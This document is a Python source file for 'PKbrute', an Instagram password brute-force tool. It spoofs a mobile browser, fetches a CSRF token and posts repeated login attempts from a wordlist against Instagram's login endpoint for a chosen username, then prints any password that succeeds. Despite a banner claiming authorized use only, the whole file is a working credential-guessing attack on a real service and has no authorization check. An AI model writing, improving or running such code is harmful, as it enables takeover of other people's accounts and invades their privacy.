#!/usr/bin/env python3
"""
PKbrute - Instagram Brute Force Tool (Fixed)
Developed by Pankaj
For authorized security testing only
"""

import requests
import sys
import time
from urllib.parse import urlparse
from colorama import init, Fore, Style
import os
import random
import json

# Initialize colorama
init(autoreset=True)

# Branding
BANNER = f"""
{Fore.CYAN}{'='*60}
{Fore.RED}██████╗ ██╗  ██╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
{Fore.RED}██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
{Fore.RED}██████╔╝█████╔╝     ██████╔╝██████╔╝██║   ██║   ██║   █████╗
{Fore.RED}██╔═══╝ ██╔═██╗     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
{Fore.RED}██║     ██║  ██╗    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
{Fore.RED}╚═╝     ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
{Fore.GREEN}              Instagram Brute Force Tool (Fixed)
{Fore.YELLOW}                   Developed by Pankaj | PKbrute v2.0
{Fore.CYAN}{'='*60}
{Fore.RED}[!] LEGAL WARNING: Only use on systems you own or have permission!
{Style.RESET_ALL}
"""

class PKbruteInstagram:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'X-IG-App-ID': '936619743392459'
        })
        
    def print_banner(self):
        print(BANNER)
        
    def get_csrf_token(self):
        try:
            response = self.session.get('https://www.instagram.com/', timeout=10)
            for cookie in self.session.cookies:
                if cookie.name == 'csrftoken':
                    return cookie.value
            return None
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting CSRF token: {e}{Style.RESET_ALL}")
            return None
    
    def test_instagram_login(self, username, password):
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return False
        
        self.session.headers.update({
            'X-CSRFToken': csrf_token,
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        try:
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                timeout=10,
                allow_redirects=False
            )
            
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    if resp_json.get('authenticated'):
                        return True
                    if resp_json.get('user'):
                        return True
                    if resp_json.get('status') == 'ok':
                        return True
                except:
                    pass
            
            if 'checkpoint_required' in str(response.text):
                print(f"{Fore.YELLOW}[!] Checkpoint required{Style.RESET_ALL}")
            return False
            
        except Exception as e:
            return False
    
    def create_test_wordlist(self):
        test_passwords = ['admin', 'password', '123456', 'qwerty', 'letmein', '123456789']
        test_path = os.path.expanduser('~/test_wordlist.txt')
        with open(test_path, 'w') as f:
            for pwd in test_passwords:
                f.write(pwd + '\n')
        print(f"{Fore.GREEN}[✓] Test wordlist created at: {test_path}{Style.RESET_ALL}")
        return test_path

    def run_attack(self):
        self.print_banner()
        
        print(f"\n{Fore.YELLOW}[?] Enter the Instagram username to test{Style.RESET_ALL}")
        username = input(f"{Fore.GREEN}Username: {Style.RESET_ALL}").strip()
        
        print(f"\n{Fore.YELLOW}[?] Enter the FULL path to password wordlist{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Example: /usr/share/wordlists/rockyou.txt{Style.RESET_ALL}")
        wordlist_path = input(f"{Fore.GREEN}Wordlist path: {Style.RESET_ALL}").strip()
        
        if not os.path.exists(wordlist_path):
            print(f"{Fore.RED}[!] Wordlist not found!{Style.RESET_ALL}")
            create = input(f"{Fore.YELLOW}[?] Create a test wordlist? (yes/no): {Style.RESET_ALL}").lower()
            if create == 'yes':
                wordlist_path = self.create_test_wordlist()
            else:
                return
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Fore.RED}[!] Cannot read wordlist: {e}{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[?] Set delay between attempts (default: 1.0): {Style.RESET_ALL}", end='')
        try:
            delay_setting = float(input()) or 1.0
        except:
            delay_setting = 1.0
        
        print(f"\n{Fore.RED}{'='*50}")
        print(f"TARGET: {username}")
        print(f"PASSWORDS: {len(passwords)}")
        print(f"DELAY: {delay_setting}s")
        print(f"{'='*50}{Style.RESET_ALL}")
        
        confirm = input(f"{Fore.RED}[!] Start attack? (yes/no): {Style.RESET_ALL}")
        
        # FIXED LINE: Added colon at the end
        if confirm.lower() == 'yes':
            print(f"\n{Fore.CYAN}[*] Starting brute force...{Style.RESET_ALL}\n")
            start_time = time.time()
            found = False
            
            for idx, password in enumerate(passwords, 1):
                percent = (idx / len(passwords)) * 100
                print(f"{Fore.YELLOW}Trying: {password} ({percent:.1f}%)...{Style.RESET_ALL}", end='\r')
                
                if self.test_instagram_login(username, password):
                    print(f"\n\n{Fore.GREEN}{'='*60}")
                    print(f"{Fore.GREEN}🎉 SUCCESS! PASSWORD FOUND! 🎉{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}Username: {username}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}Password: {password}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
                    found = True
                    break
                
                time.sleep(delay_setting)
            
            if not found:
                print(f"\n\n{Fore.RED}{'='*60}")
                print(f"{Fore.RED}❌ NO PASSWORD FOUND ❌{Style.RESET_ALL}")
                print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] Attack cancelled{Style.RESET_ALL}")

def main():
    tool = PKbruteInstagram()
    try:
        tool.run_attack()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Attack stopped by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
